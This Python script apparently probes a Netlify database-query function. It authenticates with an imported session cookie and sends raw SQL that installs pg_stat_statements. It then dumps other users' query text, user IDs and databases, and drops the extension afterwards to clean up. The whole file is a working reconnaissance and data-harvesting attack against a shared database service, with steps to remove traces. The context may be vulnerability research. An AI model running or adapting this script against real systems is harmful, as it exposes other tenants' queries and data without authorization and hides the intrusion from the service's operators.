# -*- coding: utf-8 -*-
"""pg_stat_statements PG18 视图结构 + 其他 userid 语句侦察"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:2500].decode('utf-8', 'ignore')
    conn.close()
    return st, out


st, out = q('create extension if not exists pg_stat_statements')
print('install [%d] %s' % (st, out[:200]))
st, out = q("select column_name from information_schema.columns where table_name='pg_stat_statements' order by ordinal_position")
print('列 [%d] %s' % (st, out[:900]))
st, out = q("select userid, dbid, query, calls from pg_stat_statements order by calls desc limit 40")
print('全量 [%d] %s' % (st, out[:2200]))
st, out = q("select userid::regrole, dbid, count(*) from pg_stat_statements group by 1,2 order by 3 desc")
print('user 分布 [%d] %s' % (st, out[:900]))
q('drop extension if exists pg_stat_statements cascade')
print('cleaned')
